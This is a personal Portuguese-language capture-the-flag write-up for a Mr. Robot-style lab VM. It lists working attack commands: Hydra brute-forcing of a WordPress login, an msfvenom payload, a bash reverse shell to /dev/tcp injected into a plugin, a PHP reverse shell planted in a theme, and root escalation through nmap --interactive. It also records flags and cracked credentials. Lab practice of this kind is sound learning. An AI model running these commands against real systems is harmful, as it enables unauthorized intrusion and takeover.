@@ -1,0 +1,147 @@
+Meu ip = 192.268.0.17
+IP Alvo = 192.168.0.9
+portas abertas 80 e 443
+
+Descobri que roda um server wpress
+
+encontrei
+
+http://192.168.0.9/robots.txt retornou 3 arquivos:
+
+User-agent: * = retornou pesquisa de google sobre gestão de ssh, busca 2 sem o * retornou uma página de 404 com opção de login que me levou até: http://192.168.0.9/wp-login.php
+
+
+fsocity.dic = dicionario de 85k words (descoberto com comando "cat")
+
+key-1-of-3.txt = 073403c8a58a1f80d943455fb30724b9  FLAG 1/3
+
+http://192.168.0.9/xmlrpc.php = resultou em Página que informa que o server só aceita metodo POST
+http://192.168.0.9/wp-cron.php = resultou em Página branca
+
+
+usei o comando "hydra -L fsocity.dic -p test 192.168.0.9 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30
+" 
+Que quer dizer = Hydra= ferramenta -L (lista a ser usada) -p (senha a ser usada no caso "test") onde foi usado (192.168.0.9) metodo que foi usado "http-post-form " pois foi encontrado a página que explicava que o server só aceitava metodo post (a sintaxe do hydra foi pesquisada no proprio site e editei o exemplo) 
+
+"/wp-login.php: (é o subdominio que vai ser atacado log= É o campo User que utilizamos o dicionario para buscar &pwd=^PWD^ é a senha que nessa primeira operação foi usada "test" pois estava buscando Usuario primeiro
+
+:Invalid username" é para ignorar os resultados que vierem como usuario invalido
+
+-t 30 o tempo maximo que a aplicação deve rodar
+
+A partir disso encontrei o user Elliot
+
+Inverti o comando e fiz -l Elliot ( para fazer o username ser sempre Elliot) e -P fsocity.dic para dessa vez usar o dicionario pra pegar a senha e alterei o codigo do erro de : Invalid username para :The password that u entered for the username" pois é o erro que aparece no site
+
+enquanto rodava a hydra com a lista de 85k words descobri como usar sort e uniq pra gerar um arquivo mais eficiente
+
+o comando foi  "sort (organiza alfabeticamente) -u(ignora as duplicatas consecutivas q organizamos com sort) fsocity.dic(lista de 85k words q ia levar 11h p completar) >(cria novo documento e salva saida do comando) Ufsocity.dic(novo dicionario com 11k words)
+
+CAncelei o hydra q tava rodando e atualizei para o diretorio mais eficiente
+
+não foi encontrado senha valida na lista :( mas pelo manos das 11h rodei apenas 15 minutos 
+
+Fiquei desacreditado que não tinha a senha na lista  e rodei o programa sem o -t 30 pra ver no que dava
+
+TEntando achar mais subdominios com dirbuster e sua lista de diretoris padrão tamanho media
+
+Acabei usandoo gobuster por ser mais repido e ter sintaxe mais pratica com o comando gobuster dir -u 192.168.0.9 -w /home/kali/common.txt -s 200 ( wordlist do github , -s 200 tras apenas codigos validos gobuster precisa ser definido o que eu estou atras logo:
+
+gobuster= ferramenta, dir= to extraindo os diretorios, -u é a url do alvo -w caminho da wordlist -s tras o código especifico de um diretorio encontrado
+
+DEpois de muito tentar renomear a Ufscocity e tentar achar a senha com a mesma lista nunca dando certo e mesmo depois de um monte de vezes e erros de wifi, eu busquei ajuda em um walktrough por essa parte e vi 2 jeitos de pegar a senha mas nenhum fucionava são eles:
+acessar 192.168.0.9/license retornava no passoa passo uma Página pra nos chamar de script kitty mas no meu vinha a licensa do WP
+reutilizar a lista fsocity.dic como eu estava fazendo e tendo resultado negativo 
+
+busquei varios passo a passos e um deles tentava o hydra com outro comando ( sudo hydra -l Elliot -P /home/kali/Desktop/Ufsocity.dic 192.168.0.9 http-post-form -t 30 "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:The password you entered for the username"
+)  
+
+que tentei e agora estou esperando o resultado. Funcionou agora o POR QUE CARAIOS EU NÂO SEI
+ 
+De qualquer forma agora sei que o usuario é Elliot : ER28-0652 é a senha.
+
+Consegui acesso, não sei muito pra onde ir a partir daqui, vou procurar a versão do WPress no Exploit db e ver se acho algo interessante.
+
+Acessei o editor de temas do Wp server e na sessão de estilo da Página 404 utilizei o msfvenom para criar um script de reverse shell com o comando 
+
+sfvenom -p php/meterpreter/reverse_tcp lhost=192.168.0.9 lport=4444 -f raw NÂO FUNCIONOU
+
+
+Olhei um walktrought e precisei acompanhar os passos pois nada mais funcionava segue
+
+Ativei o pluguin "hello.php" e adicionei o reverse shell exec("/bin/bash -c 'bash -i > /dev/tcp/192.168.0.10/1234 0>&1'"); 
+
+logo abaixo de echo "<p id='dolly'>$chosen</p>";  NÂO FUNCIONOU TAMBÉM
+
+Acabei percebendo que não tinha ativado o plugin e por isso não tinha funcionado 
+
+Corrigi ativando o plugin depois re upei e dei ls no nc ele já captava as conexões
+
+me identifiquei no diretorio wp-login com pwd e com ls começei a investigar oque havia lá
+
+cd ate diretorio raiz depois até o home > home/robot ACHEI A CHAVE 2
+sem permissão pra "cat key-2-of-3.txt" mas consegui usuario e robot:c3fcd3d76192e4007dfb496cca67e13b
+ com cat password.raw-md5
+
+depois de quebrar o md5 c3fcd3d76192e4007dfb496cca67e13b = robot:abcdefghijklmnopqrstuvwxyz
+
+Como nunhum dos reverse shells estava funcionando como esperado, resolvi testar outro metodo e upar um novo plugin vulneravel no caso o "responsive thumbnail slider" já pelo proprio exploit db e abri o exploit raw para editar o código do plugin e já envenena-lo com o exploit
+
+após instala r e ativar o plugin busquei o plugin no metasploit para fazer o exploit da vulnerabilidade
+
+resolvi buscar no google um "php revese shellscript" achey o do pentestmonkey, qu é bem famoso
+troquei todo o codigo da página 404 pelo script do pentestmonkey que achei no github
+
+(percebi que errava em deixar os inicios de sessão php nos temas por isso as coisas n funcionaram anteriormente)
+
+minhas muitas tentativas de fazer o reverse shell derrubaram o alvo kkkk restaurei o estado original da vm e vou seguir tentando
+
+
+COm a vm alvo ao estado original
+
+editei o tema 404.php com o script do pentestmonkey e usei o nc com (nc -lp 1234 -vv)
+a reverse shell funcionou certo dessa vez *LIÇÂO APRENDIDA ESCOLHE O METODO E MANTEM FAZER TUDO JUnTO DA RUIM*
+python -c "import pty;pty.spawn('/bin/bash')"
+
+uma vez com o shell completo 
+
+cd home/robot/
+
+su robot
+senha 
+
+key-2-of-3.txt
+822c73956184f694993bede3eb39f959
+
+tentei acessar o diretorio root mas n tinha permissão
+
+usei sudo -l para ver as permiçoes do user robot mas ele n é sudo
+
+
+Bora pesquisar como subir isso
+
+descobri q a pasta bin guarda parte de programas q podem ter acesso root e programas tem falhas vou buscar dos programas presentes qual pode ser usado para pivotear isso
+
+descobri q mount pode ser e pelo GFTBins ele tras o shellscript pra tentar
+ 
+ n rolou
+achei o nmap q tem q ser rodado em sudo e tem codigo pra pivotear no gtfobins
+descobri q a versão do nmap é a 3.81 utilizavel para pivting
+basta um nmap --interactive abre o nmap e de la dar um !sh q vira root
+
+deu certo
+navego até / com cd ..
+
+cd root
+
+key 3 ta aqui !!!
+
+cat key-3-of-3.txt
+04787ddef27c3dee1ee161b21670b4e4
+
+CTF CONcluido
+
+
+
+
+
